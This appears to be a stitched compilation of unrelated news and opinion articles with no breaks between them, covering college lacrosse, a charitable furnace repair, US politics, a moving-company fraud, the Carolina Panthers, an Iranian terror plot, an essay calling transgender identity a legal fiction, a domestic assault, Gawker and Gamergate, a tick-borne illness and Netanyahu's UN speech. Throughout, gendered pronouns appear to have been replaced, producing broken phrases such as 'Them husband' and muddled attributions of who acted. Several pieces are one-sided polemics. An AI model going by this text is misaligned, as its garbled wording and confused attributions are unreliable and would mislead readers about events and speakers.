6. Schantz's 59-Yard Heave at Carolina This looked like the harmless final few seconds of a first period. Top-rated Notre Dame had just taken a 5-3 lead at North Carolina on the fifth goal of the season by senior Kyle Trolley (with an assist from Cole Riccardi) with only five-plus seconds remaining in the opening period. That left John Travisano Jr. to compete for the Irish on the face-off at midfield. The ball kicked out toward the Notre Dame goal-and Irish first-year student Drew Schantz grabbed it and fired it perfectly (though rather unlikely) into the Tar Heel net. At least one official initially ruled no goal (the ball must be released before time runs out), and Carolina goaltender Colin Reder reacted somewhat nonchalantly in allowing the ball to get past him, maybe thinking it wouldn't count. In any event, after some consultation the goal was deemed a good one-and you can still find it on YouTube (https://www.youtube.com/watch?v=W2zJ5rs9og8).
5.Kavanagh Beats Marquette in OT Little did Irish fans know on a Wednesday in the middle of April what the Marquette lacrosse season would become. The Golden Eagles, ranked 19th and standing 8-1 (identical to the Irish record at the time), went on to surprise top-rated Denver in the BIG EAST title game (played in Denver), earn a number-six seed in the NCAA bracket and play in the NCAA Championship (including meriting a first-round home game) for the first time. On this day, the visitors hung tough in South Bend, rebounding from a 5-2 halftime deficit to hold Notre Dame scoreless in the final period to force overtime. From there Notre Dame's senior attack took charge. Thirty seconds into the overtime session Matt Kavanagh maneuvered into an open spot and fired in a patented left-handed dart for their fourth goal of the game (his high for the season in that category) to protect the number-one Irish ranking.
4. The Career of Matt Kavanagh A four-year starter at attack, Matt Kavanagh did not finish their career in 2016 as Notre Dame's all-time leading scorer (he ended up second behind Randy Colley). They didn't lead the Irish on a career basis in either goals or assist (he ended third in both categories). Yet, considering the competition level the past three years (Kavanagh's first-year student season in the BIG EAST, then three years in the ACC), it's no reach to suggest that Kavanagh qualifies as the most accomplished offensive player to wear a Notre Dame uniform. A cagey competitor who played a variety of roles over their four seasons, the Long Island product proved equally comfortable setting up their teammates or putting up goals himself. Four times they won overtime games for the Irish, none as memorable as the amazing NCAA quarterfinal comeback against Albany in 2014 when Kavanagh applied the finishing (and winning) touch.
3. Perkovic Beats Virginia in OT For the most part, the Notre Dame-Virginia game in South Bend was as even as could be. Yes, the Irish led early 2-0. Yes, the visitors responded with four straight goals to lead 4-2. And, yes, the Cavaliers took fourth-period leads both at 6-5 and then at 7-6 on a goal with 1:24 on the clock. Then Sergio Perkovic took over. Their game-tying goal came with only 23 ticks remaining-and their winning score came 29 seconds into overtime in spite of a Virginia defender doing their best to impede Perkovic's view. They flipped their stick and was promptly mobbed by a glut of fans young and old.
2. Matt Landis is Best in the Nation-Again Notre Dame in recent years has had its share of award-winners. In particular, the defensive end of the field has produced Joey Kemp and John Kemp, each named the top goaltender in the country in 2008 and 2012, respectively. But no Irish player had earned that sort of recognition in consecutive seasons the way Matt Landis did in winning the USILA William C. Schmeisser Award as the top defenseman in Division I lacrosse in both 2015 and 2016. Landis also is a two-time Atlantic Coast Conference Defensive Player of the Year. The Irish in recent years have distinguished themselves with their particularly stingy defensive player, yet it may be a while before another Notre Dame defender comes along with the skill, consistency and productivity contributed by Landis.
1. Sixty Minutes of Top-Notch Lacrosse at Syracuse At no time during the 2016 season did Notre Dame do a better job of putting together a full game's worth of lacrosse at both ends of the field than in winning 17-7 at Syracuse. The Irish had never beaten the Orange in the Carrier Dome (only three previous attempts)-and that night in Syracuse they made it look easy under what appeared to be challenging circumstances. Notre Dame's appearance at the Dome came on the weekend Syracuse invited back all its former living players to celebrate 100 years of Orange lacrosse. The Irish led 4-1 early, 9-4 at the break (nine goals tied Notre Dame's season high for a half) and scored the final five goals of the game-with Matt Kavanagh contributing a career-high nine points (six assists). The Irish win ended Syracuse's 13-game home-field win streak and marked the worst Orange defeat in 29 years. And the win certainly looked even better after Syracuse won the ACC Championship four weekends later.
When a military wife's furnace broke down, a Pennsylvania repairman stepped in and fixed the malfunctioning unit at a huge discount.
They charged them $1.
“He said that the $1 was a joke and to thank my husband for their service,” Bridget Stevens wrote in a since-deleted Facebook post that has gone viral.
Paul Betlyn of Moon Township's Betlyn Heating and Cooling said the job normally would have cost about $150, but they gave Stevens, a mother of two, a “deployment discount.”
“I'm not the hero here,” Betlyn told ABC News. “The deployed, they're the heroes.”
Them husband, Bobby, is deployed overseas with the National Guard. So when they arrived home to a cold house one evening earlier this month, they called Betlyn, expecting to get an answering machine.
“Ultimately, Paul, the owner, answered and was very patient as they walked me through different things to do to try to get it back on,” Stevens wrote in the Facebook post.
But when none of Betlyn's suggestions fixed the issue, they drove to Stevens' house to look at the furnace himself.
“As they were working on the furnace, we got to talking about Bobby and the deployment,” Stevens wrote. “I had mentioned in passing that I tried to figure it out with my husband, but since he's deployed and couldn't see it, they wouldn't know what to do.”
Stevens said they were “apprehensive” about the cost. Then Betlyn handed them the bill.
“I was completely overwhelmed and in shock when Paul handed me the slip,” Stevens told ABC News. “I didn't really know what to say, and I still have a hard time finding the words to truly express my appreciation.”
Betlyn said they were just continuing a family tradition.
“My grandfather was a milkman during the Great Depression and many times he'd go to the door and the woman didn't have any money for milk. But the baby was crying in the background. So he'd put the milk on the table,” Betlyn told ABC News. “And when I heard about Bridget with their husband being deployed…I put the milk on the table.”
Betlyn has since started a “Military Deployment Kisses Fund” on gofundme.com. The aim is to raise money to send families overseas to meet with loved ones during lengthy deployments. He's raised nearly $1,500 in three days.
Netroots go gaga for Elizabeth Warren
PROVIDENCE—This year's Netroots Nation convention attracted a broad array of Democratic talent but one figure stood above all others: Elizabeth Warren, the party's nominee against Massachusetts GOP Sen. Scott Brown.
It's hard to overstate Warren's popularity among progressives. A keynote panel that featured them drew an enormous crowd, festooned with Elizabeth Warren buttons. At a reception they were accorded rock star status, with bloggers and activists queuing up to have their photos taken with them One panel was even dedicated to Massachusetts politics and their race.
Daily Kos founder Markos Moulitsas explained that of all the House and Senate elections this year, their race was the number one priority among progressives.
“Nobody else even comes close,” they said. “We put them up with [Sens.] Franken, Merkley, Boxer, Brown, the two Vermont senators – the solid core of progressives.”
That support on the left helps explain how a first-time candidate has raised more than $15 million in individual contributions, including more than $5.1 million through ActBlue, the online Democratic fundraising clearinghouse.
Ohio Sen. Sherrod Brown, themselves a Netroots favorite, framed Warren's appeal this way.
“She understands whose side she's on, and the side she's on is the middle class and working families and kids that want opportunity when they come out of the Army and come out of school,” they said. “That's not just the winning message in Massachusetts and Ohio, it's also the way we should govern. And that is, whose side are you on? Are you really on the side of fighting for the middle class?”
POLITICO's Alexander Trowbridge captures some of the sentiment surrounding Warren in the above video.
Longueuil police are investigating a Montreal-based moving company, following a complaint from a couple who say they never received their belongings after moving, CBC News has learned.
Kim and David Lague agreed to hire the company, Mega Moving and Storage, last August after seeing an advertisement on the internet.
They said they were initially quoted a price of $1,695 to move their belongings from Nova Scotia to Ontario. But more than four months after their delivery date, and after paying Mega Moving and Storage more than $5,000, they still do not have their belongings.
"We are beyond frustrated," said David Lague. "I have yelled and screamed at people trying to get them to understand how badly we feel."
Nasty surprise
According to David Lague, the initial agreement with the company included several months of free storage to give the couple time to find a new home in Chatham, Ontario. But when they contacted Mega Moving to arrange to receive their belongings, they said the price had gone up.
I wrote an e-mail and said you can keep the money, furniture, clothes ... please give us our private personal stuff and walk away - Kim Lague
"When I contacted them and said, 'Here is the address, see you Oct. 1 for the delivery,' they said 'Not quite, we require $6,061 before we make delivery,'" Lague told CBC News.
"I said, I have a quote here for $1,695 ... this is crazy!"
In the meantime, the deal for the house in Chatham fell through, so the couple moved into David's sister's home in Welland, Ont. with just a couple of suitcases filled with summer clothes.
Most of their belongings, including furniture, winter clothes, family photos, passports and birth certificates were all inside the moving truck.
The couple has also lost specialized medical equipment including a lift chair. Kim Lague relies on the equipment, since they suffered a stroke that left them paralyzed on one side.
No sign of belongings
The Lagues said they continued to plead with Mega Moving for the delivery, and in mid-November they received an e-mail from the company that offered to return 80 per cent of their belongings if they paid $4,000 cash.
Desperate and feeling helpless, the couple agreed, and in December sent the cash.
When CBC News went to visit Mega Moving's registered location in Montreal, they were told the company had moved out two years ago. (CBC)
Despite several written promises from Mega Moving that the truck would be there in the coming days, there was no sign of their belongings.
"I stressed to them from the start, you have all my medical stuff that helps me live my daily life," Kim said. "I even got to the point where I wrote an e-mail and said you can keep the money, furniture, clothes ... please give us our private personal stuff and walk away. These people just have no concept of what they've done!"
The couple finally contacted police in Ontario, who transferred the case to the Longueuil police.
Delay blamed on 'bad management'
According to Quebec's business registry, Mega Moving and Storage is owned by Fehmi Yasar of Brossard.
The company is also registered as having an office on Côte de Liesse Road in Montreal.
these companies are allowed to get away with situations like this because there is no governing body willing to address the situation - Jim Carney, president of the Canadian Association of Movers
CBC News went to both addresses, but was not able to speak with Fehmi Yasar or find any trace of Mega Moving and Storage.
However, in a recent e-mail exchange with the Lagues, an unnamed person using the company's e-mail address said the company was having "business problems" and blamed the delay on "bad management on our side."
CBC News also recently received an unsigned e-mail from the company.
It states, "The said shipment is in the truck, not lost, stolen, or sold. We had some problems doing the delivery ... At the moment we are waiting for the truck to be able to go on the road and do the delivery. It will take one or two weeks more but not longer than that."
However, when CBC News replied with a request to see proof that the Lagues' belongings were still in the moving truck, there was no further response.
'The year of the rogue mover'
President of the Canadian Association of Movers, Jim Carney, said the Lagues' story is not all that unusual.
"It's the year of the rogue mover," they said.
"It's a very serious problem that's gotten worse with the advent of the internet, and these companies are allowed to get away with situations like this because there is no governing body willing to address the situation."
How to protect yourself
Protect yourself from rogue movers by following these steps, outlined by the Canadian Association of Movers:
Adam Schefter joins SportsCenter and breaks down the news that Jerry Richardson is selling the team after workplace misconduct allegations against him. (2:20)
CHARLOTTE, N.C. -- Tina Becker was named the chief operating officer of the Carolina Panthers on Monday, taking team owner and founder Jerry Richardson out of the day-to-day management of the organization.
Richardson is under investigation by the NFL for allegations of workplace misconduct ranging from sexual harassment to the use of a racial slur with a former team scout.
Tina Becker Carolina Panthers
The announcement of Becker's new position came less than 24 hours after Richardson announced they planned to put the team up for sale after the 2017 season.
Becker, according to the Panthers, now is one of the highest-ranking female executives among the league's 32 teams.
The decision to put Becker in this role was made by the Panthers and wasn't a request by the league, the team said.
"These have been some of the most difficult days of my 19 years with the Panthers, but I am lifted up by the strong resolve and the commitment our employees have shown to this organization," Becker said in a statement.
"Our team on the field is performing at a very high level, and I believe is bound for the Super Bowl. My immediate focus will be to ensure the corporate side of the organization performs at the same high level, while addressing the real concerns that have been raised in recent days."
Becker has served in several roles with the organization, from directing the business and administrative priorities to dealing with league affairs. Prior to joining the front office they were the team's director of entertainment. They joined the team in 1999 as director of the team cheerleaders.
Becker has the endorsement of Hugh McColl, who was instrumental in bringing the Panthers to the Carolinas in the 1990s.
"Tina is the right person to lead this organization,'' McColl, the former chairperson and CEO of Bank of America, said in a statement. "I know they are committed to the Panthers, to the city of Charlotte and to ensuring this organization is run in a professional and progressive manner."
BEIRUT (Reuters) - Iran has arrested 10 Sunni Muslim militants who were planning to bomb 50 targets across the country, Iranian intelligence minister Mahmoud Alavi said on Tuesday, according to the Fars News site.
Officials in predominantly Shi'ite Iran have said in recent weeks that Sunni militants from Islamic State have been trying to target the country.
Alavi said the arrests took place in the last week in Tehran and three other provinces in central Iran and along the border. They labeled the suspects "takfiri Wahhabi terrorists", a derogatory reference to Sunni Muslim militants.
The minister told a news conference in Tehran that the group had planned to attack busy public locations with remotely detonated explosions, suicide attacks and car bombs, according to Fars News.
One hundred kilograms of explosive material has been confiscated and an additional two tons of explosive material was intercepted before reaching the suspects, who are currently being interrogated.
Details of the attack come one day after the Ministry of Intelligence issued a statement saying it had thwarted a major terrorist attack.
Members of Iran's Revolutionary Guard have fought against Islamic State militants in Iraq in a bid to support the Shi'ite-led government in Baghdad. Guard members and volunteers are also fighting against Sunni militants in Syria to support President Bashar al-Assad.
Iranian security forces announced last month that they had arrested a dozen Islamic State fighters in the east and west of the country, and also more than 50 sympathizers who were promoting the group's ideology on the Internet.

Mythology tells us there is an area of the Atlantic Ocean called the Bermuda Triangle, within which ships and aircraft have been known to vanish without a trace. With transgenderism, all reason and logic disappears within what we might call the Gender Triangle. The Gender Triangle is that area enclosed by the relationships between three distinct models of gender—the social, medical and legal. As we shall see, these relationships are flawed beyond repair.
Start with the Social and Medical Contradictions
Let us begin with the social side of the triangle. Feminist academic types use the term “gender” to denote the socio-cultural outworking of sexual difference, existing in the form of expected behaviours and appearances—i.e., stereotypes. These folk see gender as a limiting social construct that ought to be airbrushed out of existence for the sake of justice and equality.
Yet John, who is male-sexed, is now legally permitted to enter a female restroom on grounds of having appropriated for themselves certain female stereotypes—make-up, long hair, and so on. In an apparent effort to erase stereotypes, the state has succeeded only in reinforcing them. Of course, the reason John seeks to appropriate the stereotypes that have clustered around femaleness is that it is not possible for them to appropriate femaleness itself. They can look like a female but cannot look as a female.
The second side of the Gender Triangle is the medical model. It says John can experience a difference between their sex and gender identity, with said difference falling within the sphere of medicine. Treatment may involve major surgery. The contradiction here is that certain countries permit John to change legal identity (“re-assign” gender) without surgery, hormone injections, or diagnosis. In Denmark, John need only fill in a couple of forms.
The emerging gold standard of gender re-assignment laws is that countries should implement a regime of self-declaration: When John says they are female, theirs saying so is also the very thing that makes them so. Unless we are to consider gender re-assignment to be some kind of talking therapy, we have another contradiction on our hands: How can a medical problem be cured by having the sufferer fill in a form? Transgender person, heal thyself?
Moreover, there is a more-or-less obvious tension between the academics and the surgeons, as gender identity cannot be both a social construct that the state can erase by force of law and a personal condition that a surgeon can erase with a scalpel. John cannot have been born the wrong social sex, nor can their parents have clothed them in the wrong-colored romper suit. Where does this leave us? Well, given that gender identity cannot be both social and medical, the temptation is to conclude that it must be one or the other. But there is a second conclusion available to us: namely that gender identity is something other than social or medical.
What Does a Pan-Gender Body Look Like?
To expand on this, consider just a few of the many ways in which the idea of self-chosen legal identities contradicts both academia and medicine. Let us suppose that John wishes to undergo legally unnecessary “gender confirmation surgery.” It is possible for a surgeon to sculpt John's body into a rough approximation of the female form, and this is possible precisely because the female form exists.
But what if John identifies as, say, bi-gender or pan-gender? How can any surgeon know what a pan-gender body looks like? What are we to make of this notion of attempting to transform John's body so it “fits” their mind? Such a notion can make no sense unless we understand gender to be mapped onto sex. However, both academia and law say there are more than two gender identities, so both gender theory and gender laws make a mockery of the whole idea of physically “transitioning.”
Indeed, if gender identity is defined without reference to being embodied, there are infinite possible gender identities. If John has a newfound right to enter a restroom matching their gender identity, how many restrooms do we need according to gender theory? That's right—infinite restrooms. But the state decides not to build them. Very wise. No, the state chooses to take the two existing restrooms—male and female—and collapse them into one gender-neutral restroom. This is subtraction in the name of addition.
Consider too the glaring mismatch between New York City and Britain. In New York City we can now be fined $125,000 for “mis-pronouning” somebody. The British government instead intends to scrub gender markers from passports and other documents. Gender identity appears not to know what gender identity is: Is it something so sacred that a wrong word can cost us our livelihood? Or is it something that is of such little importance it does not even deserve a place on a job application form?
John shed blood in the belief that surgery was necessary in order to have the gender marker on their passport changed from an M to an F, yet they are now being told their next passport will be genderless. The question begging to be asked is: Given that our new gender identity will not feature on our new ID, why on earth would anybody transition, be it socially or medically?
Furthermore, what is the end result of permitting each of us to choose to have any legal identity? By bearing in mind the fact that everything-ness and nothing-ness are two sides of one coin, we can see that if everybody can be anybody then everybody has the same legal identity as everybody else—everybody's legal identity is “any identity.” Come to think of it, this would explain the blank passports and the gender-neutral restrooms. Too much freedom turns out to be the same as no freedom at all.
The State Is the Problem
In all of these contradictions it is the legal that confounds the social and the medical. The problem, then, is not that academics and surgeons are at odds with each other, but that each of them is at odds with the state. This brings us to the third and most important side of the Gender Triangle—the legal model.
Regardless of whether an idea is valid or ideological, it becomes of concern to society only when it has the weight of law behind it, for without this weight the idea is unenforceable. John's wishful self-creation is none of our business unless the state makes it our business. But that is the whole problem, isn't it? The state has made it our business. So what exactly is a gender identity, from the legal perspective? That is the question.
The legal model says John's gender identity is neither the sex they are nor the sex they identify with. Rather, it is defined as being the gender they identify as. But this is no definition at all, because the definition refers only to itself—our gender identity is the identity of our gender! The state also tells us our gender identity is fundamental. But it is somehow subjective, too. It is fixed, except for those people who are gender-fluid. Is it that their gender-fluidity is fixed? Or is it that their fixed gender is fluid? Who knows?
Likewise, gender identity is somehow a part of the established order yet also radically new. It is the same, only different. It is like sex but not sex, and in being self-chosen it cannot ever be wrong. We need to have gender identity explained to us by other people, because if we do not allow them to educate us we will never come to realise how central to our understanding of ourselves gender identity has always been, right?
Transgenderism Is a Legal Fiction
It is not so difficult to pull an ideology apart when that ideology denies so much of what is known to be true. Gender ideology comes apart at the junctures of society and medicine, society and law, and medicine and law. That's three out of three. But exposing the flaws in an ideology is a lot easier than offering an explanation for why the ideology exists in the first place.
Does it not make sense to conclude that the notion of changeable legal identities originates from within law itself?
Transgenderism certainly represents an extreme case of there being more questions than answers, so here is a surprisingly simple answer: Given that transgenderism receives top-down legal backing and contradicts two competing models of gender, does it not make sense to conclude that the notion of changeable legal identities originates from within law itself? It is not that the state wishes to erase from society a social construct named Gender. Rather, it is that the state has set itself the project of airbrushing from law all signs of the biological reality named Sex. Our body is vanishing without a trace from the sea of law.
Transgenderism is an incoherent concept when thought of as a legally recognized medical condition, irrespective of whether we consider its origins to be physical or psychological. Likewise, the notion of gender identity makes no sense when seen as a social phenomenon that has made its way into law. No, the idea of hyper-fluid volatile legal identities becomes coherent only when the picture is reversed and we come to view the phenomenon as being a purely legal concept imposing itself upon society.
Several great Florida Man misadventures this week. We started with the 91-year-old man who shot at landscapers for getting grass on their car.
Now we have this one.
Jason Tackett, 38, tried suffocating their live-in girlfriend after they caught them reading their ex-boyfriend's obituary.
The couple, who have only been dating a few months, were sitting on their bed watching TV when Tackett saw their girlfriend reading something on their phone. They snatched the phone away and saw their former-boyfriend's obituary.
Tackett fell into an instant rage throwing the mattress off their bed and then began smashing things in their house, according the arrest report.
“He smashed my cat figurine collection, my Ipad,” according to the victim's police statement “He then cut up my panties with scissors and wrote whore on our living room wall with black marker.”
Tackett then leaped on the 43-year-old victim, held them down on the ground with their hand over their mouth while pinching their nostrils shut.
They got up after the woman said they couldn't breathe and that they were smothering them
They ran outside naked screaming for neighbors to call 911, but then went back into the house to get their phone back.
Police said that Tackett expressed zero remorse and considered their girlfriend reading their ex-boyfriend's obituary as cheating.
“I'm going to try to forgive them for cheating on me,” Tackett said in the police report. “But they better not look at that obituary one more time.”
The woman sustained a small cut on their left pinky finger, police said.
Tackett was charged with domestic battery by strangulation. They were released from the Manatee County jail Saturday on $10,000 bond.
When Donald Trump was elected President, there were worries that they would use the White House for profit by endorsing products they had a personal stake in. But a new poll shows that the POTUS' endorsement may be having the opposite effect – it is damaging the Trump brand.
On NBC News' “Meet the Press,” host Chuck Todd discussed a poll from Simmons Research that revealed that only 18 percent of people surveyed said they would be “more likely to use” a product endorsed by the president, while 49 percent were “less likely to use” such a product and 29 percent would “actively boycott.”
Even among those who identified as Republican, the numbers don't look good. Only 31 percent of those who selected the “more likely” option identified as Republican, compared to 23 percent who said “less likely.”

The survey also asked Americans if they would buy from a company whose CEO openly supports Trump and whether a CEO's support would lead them to pay more at a competing company. 34 percent said they would prefer not to buy at a pro-Trump CEO's company, while 30 percent said they'd be willing to pay more at a competitor.
“We know Trump is a very polarizing figure, but these data suggest that the people who don't like Trump feel much more strongly about it than the people who do like him,” Steven Millman, chief scientist at Simmons, told NBC News. “A strong association between Trump and a brand is likely to be damaging to the brand, unless its consumers are strong conservative.”

A few years ago, Gawker Media went through their own mythical period. When online public shaming was still praised as “callout culture” and righteous “internet rage” by activists, Gawker was out in front, leading the charge.
Gawker mercilessly destroyed the careers of its targets, many of whom, such as Justine Sacco and Pax Dickinson, were guilty of nothing more than off-colour jokes on social media. They were the shamers-in-chief of the internet: all the more frightening because the sins they punished were so ubiquitous and mundane. Former Gawkerite Adam Weinstein portrays this period as a kind of golden age for the blogging network.
The world has changed rapidly. Public shaming is no longer cool; John Ronson resoundingly won the argument against it with their new book, despite vain attempts of activists to (you guessed it!) publicly shame him. Attempts to portray Ronson as hostile to the”historically powerless” fell flat, as commentators eagerly embraced a mainstream author willing to speak out against the new mob mentality.
Gawker Media, which relied so heavily on the practice to grant itself the veneer of righteousness, has now become one of the most derided publications on earth. Their botched attempt to out Conde Naste executive David Geithner as gay caused outrage across the media and political landscape. Meanwhile, their long history of violating celebrities' privacy is swiftly catching up to them in the form of Hulk Hogan's $100m lawsuit, filed against Gawker for the release of a sex tape involving the wrestler.
Throughout history, great empires, states, political movements and institutions have all fallen victim to the myth of invincibility. From the Romans at the Battle of Teutoburg to the British Empire in the Boer war, the destruction of these myths is all the more painful due to the triumphs that preceded them. Few would call Gawker invincible today. Its reputation is on the rocks, as the company plans to relaunch itself later today. The Geithner story has proved to be disastrous for the company, triggering a string of editorial resignations in addition to the storm of external condemnation.
But the story doesn't strike me as a case of imperial myth-shattering. In the major historical examples – the Boers, the Vietcong, the Germanic tribesmen – great powers were humiliated at the very height of their glory by poorly-equipped, underdog opponents who should have been walkovers. The Geithner story, where Gawker had to fight the entire media establishment by itself, doesn't fit this pattern at all. So what does?
Gawker vs Gamergate
When a few thousand gamers started to draw attention to poor standards in video games journalism last September, no one predicted it would grow into a year-long movement that spanned the globe. Nor did anyone predict the damage it would do to Gawker Media. Gamers had no track record as campaigners or great organisers, nor as social media activists. When #GamerGate emerged, it was a bolt from the blue, and some predicted it would be over in a week.
But gamers were determined. They had a laundry list of complaints against the gaming press, and they had Gawker in their sights from the beginning. The name of Gamergate's hub on Reddit – “/r/KotakuInAction” – is revealing. (Kotaku, for those of you who don't know, is Gawker's video games vertical.) The near-ruination of game developer Brad Wardell by Kotaku's poor reporting, a steady stream of outrage-mongering on the topics of race and gender, and perceived conflicts of interest on the part of Kotaku writers meant many gamers had gone sour on the site by the start of Gamergate. One supporter of the hashtag described Kotaku as “yellow journalism and tabloid gossip brewed into a foul, brain-killing mess.”
Twitter in 2014 was the land of #YesAllWomen and #CancelColbert, a haven of politically correct outrage. The emergence of a culturally libertarian, anti-censorship, anti-narrative hashtag like Gamergate was unexpected, to say the least. Progressive journalists in the games and tech press reacted with instant hostility and released a string of articles branding gamers as reactionary, sexist “hyper-consumers.” As Slate‘s David Auerbach argued at the time, games journalists had essentially declared war on their own audience.
Gamers used the attacks to their advantage, sending a deluge of complaints to companies that advertised with their antagonizers. Gawker, with its long history of unethical reporting, was particularly vulnerable to this strategy and lost its first sponsor just days after Gamergate began its campaign. They had already locked themselves in a losing battle — but their Quinctilius Varus had yet to enter the field. That came later.

If there is one feature that unites the imperial downfalls of history, it is the moment of hubris. The moment at which an opponent's strength is wildly underestimated, or one's own is wildly overestimated.
In October 2014, Gawker writer Sam Biddle did both. They no doubt intended to do to Gamergate what they had done to Justine Sacco — publicly shame them, or “degrade them into submission,” as they put it. But their tweets — posted, disastrously, during national bullying awareness month — caused a PR calamity that would lead to one of Gawker's most visible humiliations. The shamers were about to be shamed.
https://twitter.com/samfbiddle/status/523246277950058496
Gamergate's boycott campaign pivoted, focusing all of its firepower on Gawker Media's advertisers and sponsors. Within a day, Biddle had taken to Twitter to issue a public apology — an act that would become a feature of Gawker in the months to come. Editorial director Joel Johnson reiterated their apology on the front page of Gawker — another sign of the future. Johnson also sent a memo to Gawker's writers warning them to watch their words on social media. A publication whose writers were famed for their recklessness was beginning to show signs of caution.
Even Gawker couldn't hide the extent of their defeat. Editor-in-Chief Max Read summed up their feelings in a headline: “How We Got Rolled by the Dishonest Fascists of GamerGate.” A few months later, the full extent of the damage was revealed — Gamergate had cost Gawker seven figures in lost advertising revenue. The myth of invincibility was over.
Gawker vs Gamergate had all the features of a historic humiliation. On the one hand, there was Gawker, one of the web's Great Powers. A well-resourced, New York-based “internet bully” with a reputation for destroying people. On the other hand, there were gamers — disorganised amateurs. It's hard to find a better underdog story.

Benefits Street has been recommissioned for a second series by Channel 4.
The controversial documentary series will return for six more episodes in 2015.
Channel 4
The programme sparked national debate about the welfare system when it aired earlier this year, making stars of its contributors such as White Dee in the process.
Filming has begun on a street in Stockton-On-Tees, near Middlesbrough.
Channel 4's Head of Documentaries, Nick Mirsky, said: "Benefits Street fits perfectly with Channel 4's remit of producing programming that stimulates discussion and debate, the first series did this on a national scale.
"It brought a very human focus to an issue that is at the heart of who we are in Britain today. I'm sure the new series will advance that debate and introduce viewers to a new group of compelling residents."
Love Productions' Creative Director for Factual, Kieran Smith, added: "Like many places in the UK Stockton has been hit hard by the recession and economic decline. Those who are reliant on welfare for the majority of their income are some of the hardest hit.
"We have been invited to share in the lives of the residents of one street where many people rely on benefits to survive. It's an incredibly close community and whilst people may not have much, they do have one another to turn to for help."
Series one-star White Dee is currently taking part in Celebrity Big Brother on Channel 5.
In June, the series was cleared by Ofcom, after it picked up a large number of complaints from viewers, including those who claimed the show "misrepresented and vilified benefits claimants".
The production team behind the show are also working on Immigration Street, a six-part programme focusing on life in Derby Road in Southampton.

Jan 17 (Reuters) - U.S. scientists have discovered a new deer tick-borne disease in humans, with the viral-like illness sharing similarities both with Lyme disease and relapsing fever infections.
The as-yet unnamed ailment is one of five caused by the Borrelia miyamotoi pathogen carried by blacklegged ticks, said Dr. Peter Krause, senior research scientist at Yale School of Public Health and lead author of a study published in the New England Journal of Medicine on Thursday.
A distant relative of Lyme, the bacterium was first found in ticks in Japan in 1995, and then was identified by Yale researchers in Connecticut in 2001 and again in Russia in 2011, the study said. The illness also can resemble another disease caused by a bacterium in the Borrelia family transmitted by ticks and body lice that is marked by repeated episodes of fever.
The study published Thursday by Yale, New York Medical College and other institutions is the first to describe the unique type of Borrelia bacterium that causes the disease and to detail its symptoms.
The study said blood tests identified Borrelia miyamotoi in 18 human patients in southern New England and neighboring New York in recent years. Symptoms of the resulting illness can include fever, muscular aches and pains, headaches and fatigue, with a small portion also developing a rash such as with Lyme disease.
One complication experienced by multiple patients, however, was repeated episodes of fever - a significant difference from what has been reported by people diagnosed with Lyme disease, said Krause.
"We think that if this organism is untreated it probably would lead to relapsing fever," Krause said in a phone interview.
The new study found that patients who were not treated with antibiotics after a first bout of fever could see their body temperature spike again after a week or two.
Drugs such as doxycycline and amoxicillin, effective in combating Lyme disease, seem to clear symptoms and the infection, Krause said.
Borrelia bacteria are found wherever deer ticks and Lyme disease are found, with most occurring in the U.S. Northeast and the northern Midwest. Ticks infected with the bacteria also were found in the far western United States, they added.
The disease tends to occur in late spring, summer or early autumn, and experts say that lab testing is required to confirm its presence.

Israeli PM Binyamin Netanyahu uses a red pen and a chart at the United Nations to illustrate the Iranian nuclear threat
When a senior Israeli official told Reuters that Binyamin Netanyahu would be drawing a red line on Iran's nuclear program, they were not kidding.
Speaking at the United Nations general assembly in New York, the Israeli prime minister unfolded a chart with a cartoon-style drawing of a nuclear bomb, and proceeded to draw on it with a red magic-marker.
"This is a bomb," they say. "This is a fuse."
Binyamin Netanyahu uses a graphic as they address general assembly at UN headquarters in New York. Photograph: Lu
The only peaceful way to prevent an Iranian nuclear bomb is to place a "clear red line" on uranium enrichment, Netanyahu said.
"A red line must be drawn ... on Iran's efforts to enrich uranium," they said. "Basically any bomb consists of explosive material and a mechanism to ignite it. ... In the case of Iran's plans, the gunpowder is enriched uranium. The fuse is a nuclear detonator." Netanyahu sad it was far more difficult for Iran to enrich uranium than to build the fuse.
They explained where where the red line on enriching uranium should be drawn. They said Iran is well into "the second stage" of enrichment. By next summer, they will move on to the final stage, they said. From there it's only a few months, maybe a few weeks, before they get enough enriched uranium for a bomb, they say.
"If these are the facts, where should a red line be drawn?" they ask.
Netanyahu took out a red marker. "Where should a red line be drawn? they say. "A red line should be drawn right here." They drew a line at the end of the "second stage," at 90% of the necessary enriched uranium for the first bomb.
It was an eye-catching, if bizarre, moment. And inevitably it drew polarised reactions.
Typically: this, from former White House press secretary Ari Fleischer:
Ari Fleischer (@AriFleischer) Bibi's use of that chart was one of the most effective, gripping, uses of a chart I've ever seen. Is the world listening??
And this, from Jeffrey Goldberg of The Atlantic:
Jeffrey Goldberg (@JeffreyGoldberg) Okay, it's official: #Netanyahu has no idea what he's doing. They have just turned a serious issue into a joke.
Take your pick.

There are two math fallacies affecting the current economic debate. First, Republicans continue to argue that tax cuts for the wealthy are key to growing the economy, despite solid evidence to the contrary. This argument is their primary objection to allowing President George W. Bush's tax cuts on the wealthy expiry at the end of the year.
The facts fly in the face of their argument. We know what happened in the 2000s after the Bush tax cuts: Despite the supposedly job-creating tax breaks, our economy experienced its worst record for growth in investment, employment, and incomes in half a century, an outcome devastating to our middle class.
Yet Republican leaders are working to make sure that the math fits their version of reality, rather than actual reality. As the New York Times has reported, the Congressional Research Service, a non-partisan arm of Congress, was forced by Republican leaders in the Senate to withdraw an economic report showing "no correlation between top tax rates and economic growth."
Getting the math right about the effects of tax cuts on our economy is a priority given that the national conversation has now turned to whether these tax cuts should be extended. If Nate Silver was an economist, they would aggregate all the studies that show that more tax cuts for the wealthy will not grow the middle class. Fortunately, others have looked at the data and found just that.
A second example of math denialism is the notion that sharp cuts in spending to eliminate a budget deficit when an economy hasn't fully recovered from a deep recession will lead to robust economic growth and job creation. Both economic theory and recent experience in countries that have gone down the austerity path show that this perspective is willfully in denial of empirical reality. Countries that have been implementing austerity packages are now teetering toward, if not already in, recession.
The United Kingdom, for example, has pared back spending, but as it have done so, the rate of growth and job creation have both stalled. In fact, newly released forecasts from the International Monetary Fund show economic-growth prospects being revised down for Great Britain, as well as for most other European countries that have implemented aggressive austerity regimes, including Germany and France. According to the IMF's analysis, fiscal contraction now poses one of the top risks not just to the U.S. economy, but also to the overall world economic recovery.
Even as Republicans struggle with math in election forecasts or economic policy, they are also failing to grapple with science. GOP leaders also continue to argue that evidence of global warming is really a case of "manipulated data." But the empirical evidence is overwhelming that climate change is not only real, it is having serious economic and social impacts. The economic impacts are proving to be quite large: The cost of extreme weather events, which are becoming more common as the earth warms, is estimated to be $14.5 billion -- and that's before the cost of Hurricane Sandy.
